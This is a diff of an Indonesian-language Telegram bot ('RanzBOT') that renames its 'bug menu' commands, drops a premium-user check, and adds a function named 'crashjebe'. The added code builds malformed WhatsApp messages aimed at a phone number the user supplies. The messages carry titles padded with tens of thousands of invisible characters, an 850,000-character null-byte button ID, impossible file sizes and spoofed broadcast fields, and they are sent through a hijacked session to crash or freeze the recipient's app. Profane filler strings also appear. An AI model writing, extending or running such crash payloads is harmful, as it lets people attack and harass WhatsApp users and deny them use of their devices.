@@ -534,9 +534,10 @@ Aloo ${ctx.from.first_name || 'User'} Aku Adalah Bot RanzBOT.2 Yang Siap, Memban
 ╭──(     \`ʙᴜɢᴍᴇɴᴜ\`     )
 │
 ㅒ
-│ /soasik
-│ /daget
-│ /nope
+│ /ranzv1
+│ /ranzv2
+│ /ranzv3
+│ /ranzv4
 ㅒ
 │
 ╰━━━ㅡ━━━━━ㅡ━━━━━━⬣
@@ -1555,7 +1556,7 @@ bot.command('connect', async (ctx) => {
     ctx.reply('Terjadi kesalahan saat memproses perintah.');
   }
 });
-bot.command("soasik", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
+bot.command("ranzv3", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
   const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
     const userId = ctx.from.id;
 
@@ -1578,7 +1579,7 @@ bot.command("soasik", cooldownMiddleware, checkWhatsAppConnection, async ctx => 
   // Menyelesaikan proses response
   await donerespone(target, ctx);
 });
-bot.command("daget", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
+bot.command("ranzv1", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
   const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
     const userId = ctx.from.id;
 
@@ -1600,7 +1601,7 @@ bot.command("daget", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
   // Menyelesaikan proses response
   await donerespone(target, ctx);
 });
-bot.command("nope", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
+bot.command("ranzv2", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
   const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
     const userId = ctx.from.id;
 
@@ -1623,7 +1624,7 @@ bot.command("nope", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
   // Menyelesaikan proses response
   await donerespone(target, ctx);
 });
-bot.command("xcsystemui", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
+bot.command("ran", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
   const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
     const userId = ctx.from.id;
 
@@ -1651,14 +1652,11 @@ bot.command("xcsystemui", cooldownMiddleware, checkWhatsAppConnection, async ctx
   // Menyelesaikan proses response
   await donerespone(target, ctx);
 });
-bot.command("xcblank", cooldownMiddleware, async ctx => {
+bot.command("ranzv4", cooldownMiddleware, async ctx => {
   const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
     const userId = ctx.from.id;
 
     // Cek apakah pengguna adalah premium
-    if (!isPremium(userId)) {
-        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
-    }
   if (!q) {
     return ctx.reply(`Example: commandnya 62×××`);
   }
@@ -1670,7 +1668,7 @@ bot.command("xcblank", cooldownMiddleware, async ctx => {
 
   // Melakukan proses freezing 50 kali
   for (let i = 0; i < 1; i++) {
-      await crashcursor(target, { ptcp: true });
+      await crashjebe(target, { ptcp: true });
   }
 
   // Menyelesaikan proses response
@@ -2829,6 +2827,155 @@ viewOnceMessage: {
 message: {
 listResponseMessage: {
 title: "misi, ini bang aswin bukan?" + "ㅤ".repeat(45000),
+listType: 2,
+singleSelectReply: {
+    selectedRowId: "🩸"
+},
+contextInfo: {
+stanzaId: cay.generateMessageTag(),
+participant: "0@s.whatsapp.net",
+remoteJid: "status@broadcast",
+mentionedJid: [target, "13135550002@s.whatsapp.net"],
+quotedMessage: {
+                buttonsMessage: {
+                    documentMessage: {
+                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
+                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
+                        fileLength: "9999999999999",
+                        pageCount: 3567587327,
+                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
+                        fileName: "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟",
+                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
+                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
+                        mediaKeyTimestamp: "1735456100",
+                        contactVcard: true,
+                        caption: "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi"
+                    },
+                    contentText: "- Kami Yo \"👋\"",
+                    footerText: "© Caywzz",
+                    buttons: [
+                        {
+                            buttonId: "\u0000".repeat(850000),
+                            buttonText: {
+                                displayText: "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟"
+                            },
+                            type: 1
+                        }
+                    ],
+                    headerType: 3
+                }
+},
+conversionSource: "porn",
+conversionData: crypto.randomBytes(16),
+conversionDelaySeconds: 9999,
+forwardingScore: 999999,
+isForwarded: true,
+quotedAd: {
+advertiserName: " x ",
+mediaType: "IMAGE",
+jpegThumbnail: tdxlol,
+caption: " x "
+},
+placeholderKey: {
+remoteJid: "0@s.whatsapp.net",
+fromMe: false,
+id: "ABCDEF1234567890"
+},
+expiration: -99999,
+ephemeralSettingTimestamp: Date.now(),
+ephemeralSharedSecret: crypto.randomBytes(16),
+entryPointConversionSource: "kontols",
+entryPointConversionApp: "kontols",
+actionLink: {
+url: "t.me/devor6core",
+buttonTitle: "konstol"
+},
+disappearingMode:{
+initiator:1,
+trigger:2,
+initiatorDeviceJid: target,
+initiatedByMe:true
+},
+groupSubject: "kontol",
+parentGroupJid: "kontolll",
+trustBannerType: "kontol",
+trustBannerAction: 99999,
+isSampled: true,
+externalAdReply: {
+title: "! Starevxz - \"𝗋34\" 🩸",
+mediaType: 2,
+renderLargerThumbnail: false,
+showAdAttribution: false,
+containsAutoReply: false,
+body: "© running since 2020 to 20##?",
+thumbnail: tdxlol,
+sourceUrl: "go fuck yourself",
+sourceId: "dvx - problem",
+ctwaClid: "cta",
+ref: "ref",
+clickToWhatsappCall: true,
+automatedGreetingMessageShown: false,
+greetingMessageBody: "kontol",
+ctaPayload: "cta",
+disableNudge: true,
+originalImageUrl: "konstol"
+},
+featureEligibilities: {
+cannotBeReactedTo: true,
+cannotBeRanked: true,
+canRequestFeedback: true
+},
+forwardedNewsletterMessageInfo: {
+newsletterJid: "120363274419384848@newsletter",
+serverMessageId: 1,
+newsletterName: `- Caywzz 𖣂      - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
+contentType: 3,
+accessibilityText: "kontol"
+},
+statusAttributionType: 2,
+utm: {
+utmSource: "utm",
+utmCampaign: "utm2"
+}
+},
+description: "by : Caywzz "
+},
+messageContextInfo: {
+messageSecret: crypto.randomBytes(32),
+supportPayload: JSON.stringify({
+version: 2,
+is_ai_message: true,
+should_show_system_message: true,
+ticket_id: crypto.randomBytes(16),
+}),
+},
+}
+}
+}
+
+await cay.relayMessage(target, messagePayload, {
+additionalNodes: stanza,
+participant: { jid : target }
+});
+}
+async function crashjebe(target, ptcp = true) {
+const stanza = [
+{
+attrs: { biz_bot: '1' },
+tag: "bot",
+},
+{
+attrs: {},
+tag: "biz",
+},
+];
+
+let messagePayload = {
+viewOnceMessage: {
+message: {
+listResponseMessage: {
+title: "ada akun ff gk bang?" + "ㅤ".repeat(45000),
 listType: 2,
 singleSelectReply: {
     selectedRowId: "🩸"
